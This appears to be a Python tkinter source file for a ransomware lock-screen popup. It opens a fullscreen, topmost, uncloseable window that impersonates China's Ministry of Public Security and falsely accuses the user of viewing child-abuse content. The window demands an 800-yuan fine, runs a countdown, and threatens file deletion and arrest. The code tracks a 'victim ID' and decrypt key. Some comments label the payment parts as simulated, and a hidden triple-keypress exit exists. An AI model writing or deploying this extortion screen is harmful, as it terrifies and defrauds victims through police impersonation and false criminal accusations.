import sys
import json
import time
import hashlib
import platform
from pathlib import Path
from datetime import datetime, timedelta

try:
    import tkinter as tk
except ImportError:
    print("[错误] 需要 tkinter，请安装 Python 时勾选 tcl/tk")
    sys.exit(1)

# ============================================================
# 不再需要 Pillow 背景图片，但保留导入以避免报错
# ============================================================
try:
    from PIL import Image, ImageTk, ImageEnhance
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

from config import POPUP_CONFIG, generate_victim_id, generate_decrypt_key


# ============================================================
# 控制台日志（仅打印，不写文件）
# ============================================================
def log_msg(msg):
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{now_str}] {msg}")


class RansomPopup:
    """
    新版弹窗 UI —— 仿“公安部罚款”风格
    功能保持不变：全屏、置顶、不可关闭、倒计时、安全退出（Ctrl+Shift+Q x3）
    """

    # ============================================================
    # 初始化
    # ============================================================
    def __init__(self):
        log_msg("===== RansomPopup (新版UI) 启动 =====")
        self.victim_id = generate_victim_id()
        self.file_count = 0
        self.decrypt_key = generate_decrypt_key(self.victim_id)
        log_msg(f"victim_id={self.victim_id}")

        self._load_config()

        # 安全退出计数
        self.exit_count = 0
        self.last_exit_press = 0

        # 倒计时（保持原有72小时）
        self.countdown_end = (
                datetime.now()
                + timedelta(hours=POPUP_CONFIG["countdown_hours"])
        )
        log_msg(f"倒计时结束时间: {self.countdown_end}")

        # 构建全新 UI
        self._build_gui()

    # ============================================================
    # 配置读取（保留）
    # ============================================================
    def _load_config(self):
        cfg_path = Path(__file__).parent / "popup_config.json"
        if not cfg_path.exists():
            return
        try:
            data = json.loads(cfg_path.read_text(encoding="utf-8"))
            self.victim_id = data.get("victim_id", self.victim_id)
            self.file_count = data.get("file_count", self.file_count)
            self.decrypt_key = data.get("decrypt_key", self.decrypt_key)
        except Exception:
            pass

    # ============================================================
    # 资源路径（保留，但不再使用背景图）
    # ============================================================
    def get_resource_file(self, filename):
        if hasattr(sys, "_MEIPASS"):
            return Path(sys._MEIPASS) / filename
        else:
            return Path(__file__).parent / filename

    # ============================================================
    # 构建主界面（完全仿照图片1）
    # ============================================================
    def _build_gui(self):
        # ---------- 根窗口 ----------
        self.root = tk.Tk()
        self.root.title("")
        self.root.configure(bg="#FFFFFF")
        self.root.resizable(False, False)
        self.root.overrideredirect(True)          # 无标题栏
        self.root.attributes("-topmost", True)    # 置顶

        # 全屏
        try:
            self.root.attributes("-fullscreen", True)
        except Exception:
            screen_width = self.root.winfo_screenwidth()
            screen_height = self.root.winfo_screenheight()
            self.root.geometry(f"{screen_width}x{screen_height}+0+0")

        # 禁止关闭
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        # 获取屏幕尺寸
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()

        # ---------- 主容器（居中，宽度固定，类似网页） ----------
        main_width = min(800, int(screen_width * 0.75))
        main_height = min(700, int(screen_height * 0.80))

        main = tk.Frame(
            self.root,
            bg="#FFFFFF",
            highlightbackground="#CC0000",
            highlightthickness=2
        )
        main.place(
            x=(screen_width - main_width) // 2,
            y=(screen_height - main_height) // 2,
            width=main_width,
            height=main_height
        )

        # ---------- 顶部：红色警告条 ----------
        header = tk.Frame(main, bg="#CC0000", height=60)
        header.pack(fill="x", side="top")
        header.pack_propagate(False)

        tk.Label(
            header,
            text="⚠️ 你的电脑已被锁定！ ⚠️",
            font=("Microsoft YaHei", 20, "bold"),
            fg="#FFFFFF",
            bg="#CC0000"
        ).pack(expand=True)

        # ---------- 内容区（白色背景） ----------
        content = tk.Frame(main, bg="#FFFFFF")
        content.pack(fill="both", expand=True, padx=30, pady=20)

        # ---- 红色小标题 ----
        tk.Label(
            content,
            text="中华人民共和国公安部 网络安全保卫局",
            font=("Microsoft YaHei", 14, "bold"),
            fg="#CC0000",
            bg="#FFFFFF"
        ).pack(pady=(0, 10))

        # ---- 正文文字（模仿图片） ----
        text1 = (
            "您的姓：已确定。\n"
            "您的所在地：已确定。\n"
            "您当前的位置：已确定。\n"
            "您的IP地址：已确定。\n"
            "计算机上的所有文件：已锁定。\n"
        )
        tk.Label(
            content,
            text=text1,
            font=("Microsoft YaHei", 12),
            fg="#000000",
            bg="#FFFFFF",
            justify="left"
        ).pack(anchor="w", pady=5)

        # ---- 罚款金额（大号红色） ----
        tk.Label(
            content,
            text="你被罚款 800 元",
            font=("Microsoft YaHei", 22, "bold"),
            fg="#CC0000",
            bg="#FFFFFF"
        ).pack(pady=10)

        # ---- 详细说明（多行） ----
        detail_text = (
            "您因多次访问包含中华人民共和国法律禁止的内容，即恋童癖和虐待儿童内容的色情网站而被禁止。\n"
            "您必须根据第0945-13467361778号条例，将800元罚款转入公安部罚款征收账户。"
        )
        tk.Label(
            content,
            text=detail_text,
            font=("Microsoft YaHei", 11),
            fg="#000000",
            bg="#FFFFFF",
            wraplength=700,
            justify="left"
        ).pack(pady=10)

        # ---- 支付二维码占位（模拟） ----
        qr_frame = tk.Frame(content, bg="#EEEEEE", relief="solid", bd=1)
        qr_frame.pack(pady=10)
        tk.Label(
            qr_frame,
            text="[ 支付二维码 ]\n（模拟）",
            font=("Microsoft YaHei", 12),
            fg="#333333",
            bg="#EEEEEE",
            width=20,
            height=4
        ).pack()

        # ---- “缴纳罚款” 按钮（仅视觉，无实际功能） ----
        pay_btn = tk.Button(
            content,
            text="缴纳罚款",
            font=("Microsoft YaHei", 14, "bold"),
            bg="#CC0000",
            fg="#FFFFFF",
            relief="raised",
            bd=3,
            padx=20,
            pady=5,
            # 点击无实际作用，但可以显示提示（保持原有功能不变）
            command=lambda: self._show_pay_hint()
        )
        pay_btn.pack(pady=10)

        # ---- 重要须知（小字） ----
        notice = (
            "重要须知！如果您拒绝支付罚款或试图在不支付罚款的情况下自行解除锁定，\n"
            "您计算机上的所有信息将被永久删除，以防止色情制品的传播。\n"
            "警方将立即前往您的住处逮捕您。\n"
            "罚款支付期限：通知和锁定发出后 3 小时。"
        )
        tk.Label(
            content,
            text=notice,
            font=("Microsoft YaHei", 9),
            fg="#333333",
            bg="#FFFFFF",
            justify="left"
        ).pack(pady=10)

        # ---- 倒计时（保留原有功能，置于底部） ----
        countdown_frame = tk.Frame(content, bg="#FFFFFF")
        countdown_frame.pack(side="bottom", pady=10)
        tk.Label(
            countdown_frame,
            text="剩余支付时间：",
            font=("Microsoft YaHei", 12, "bold"),
            fg="#000000",
            bg="#FFFFFF"
        ).pack(side="left")
        self.countdown_label = tk.Label(
            countdown_frame,
            text="72:00:00",
            font=("Consolas", 16, "bold"),
            fg="#CC0000",
            bg="#FFFFFF"
        )
        self.countdown_label.pack(side="left", padx=10)

        # ---- 底部小字（Victim ID，保持原有功能） ----
        tk.Label(
            self.root,
            text=f"Victim ID: {self.victim_id}  |  按 Ctrl+Shift+Q 三次退出",
            font=("Consolas", 8),
            fg="#999999",
            bg="#FFFFFF"
        ).place(x=10, y=screen_height - 25)

        # ---- 绑定退出快捷键 ----
        self.root.bind("<Control-Shift-Q>", self._exit_attempt)
        self.root.bind("<Control-Shift-q>", self._exit_attempt)

        # ---- 启动倒计时更新 ----
        self._update_countdown()
        log_msg("新UI构建完成")

    # ============================================================
    # 支付按钮提示（模拟，不改变任何状态）
    # ============================================================
    def _show_pay_hint(self):
        """点击”缴纳罚款“的反馈（仅演示）"""
        # 可以弹窗提示，但为了不影响原有逻辑，只打印日志
        log_msg("用户点击了“缴纳罚款”按钮（仅模拟）")
        # 可选：显示一个临时提示
        hint = tk.Toplevel(self.root)
        hint.title("提示")
        hint.geometry("300x100")
        hint.configure(bg="#FFFFFF")
        hint.resizable(False, False)
        tk.Label(
            hint,
            text="此功能仅用于演示\n请通过合法渠道处理",
            font=("Microsoft YaHei", 12),
            bg="#FFFFFF"
        ).pack(expand=True)
        hint.after(2000, hint.destroy)

    # ============================================================
    # 倒计时更新（保留原有逻辑）
    # ============================================================
    def _update_countdown(self):
        remaining = self.countdown_end - datetime.now()
        if remaining.total_seconds() <= 0:
            self.countdown_label.config(text="00:00:00", fg="#CC0000")
            return
        hours, rem = divmod(int(remaining.total_seconds()), 3600)
        minutes, seconds = divmod(rem, 60)
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        self.countdown_label.config(text=time_str)
        if remaining.total_seconds() < 86400:
            self.countdown_label.config(fg="#CC0000")
        self.root.after(1000, self._update_countdown)

    # ============================================================
    # 安全退出（完全保留）
    # ============================================================
    def _exit_attempt(self, event=None):
        now = time.time()
        if now - self.last_exit_press > 2.0:
            self.exit_count = 0
        self.last_exit_press = now
        self.exit_count += 1
        log_msg(f"退出快捷键触发 {self.exit_count}/3")
        if self.exit_count >= 3:
            log_msg("===== 用户安全退出 =====")
            self.root.destroy()
            return
        # 临时显示提示（不影响倒计时）
        self.countdown_label.config(
            text=f"再按 {3 - self.exit_count} 次退出",
            fg="#FF8800"
        )

    # ============================================================
    # 运行
    # ============================================================
    def run(self):
        self.root.mainloop()


# ============================================================
# 入口
# ============================================================
def main():
    try:
        popup = RansomPopup()
        popup.run()
    except Exception as e:
        log_msg(f"致命错误: {e}")
        import traceback
        log_msg(traceback.format_exc())


if __name__ == "__main__":
    main()